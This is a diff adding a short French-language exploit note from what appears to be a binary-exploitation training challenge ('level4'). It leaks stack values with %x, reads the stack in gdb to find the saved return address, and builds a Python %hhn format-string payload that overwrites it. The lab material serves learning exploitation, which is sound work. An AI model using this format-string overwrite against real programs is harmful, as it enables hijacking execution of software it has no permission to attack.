@@ -1,0 +1,34 @@
+# Meme proceder que precedement.
+0000 %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
+
+>> 0000 b7ff26b0 bffff764 b7fd0ff4 0 0 bffff728 804848d bffff520 200 b7fd1ac0 b7ff37d0 30303030 20782520 25207825 78252078 20782520 <<
+
+# Donc 11 element avant le buffer.
+
+
+# On va essaye de changer la valeur de eip stocke dans la stack pour que au retour de <p>, on arrive apres le 'cmp'.
+# On lance gdb, on s'arrete avant le printf.
+
+echo "test" > /tmp/file
+gdb ./level4
+> layout asm
+> b p
+> run < /tmp/file
+...
+
+# On affiche la stack pour recuperer l'adresse de eip dans la stack.
+
+> x/16xw $esp
+
+0xbffff4d0:     0xbffff500      0xb7ff26b0      0xbffff744      0xb7fd0ff4
+0xbffff4e0:     0x00000000      0x00000000      0xbffff708      0x0804848d
+0xbffff4f0:     0xbffff500      0x00000200      0xb7fd1ac0      0xb7ff37d0
+0xbffff500:     0x74736574      0xb7e2000a      0x00000001      0xb7fef305
+
+# On voit 0x0804848d, on va donc essayer de change le 8d par 99.
+
+# L'adresse de cette valeur est 0xbffff4e0 + 12 = 0xbffff4ec
+
+# On va donc generer notre input
+
+python -c "print('\xec\xf4\xff\xbf' + ' %x' * 11 + 'A' * 70 + '%hhn')" > /tmp/file
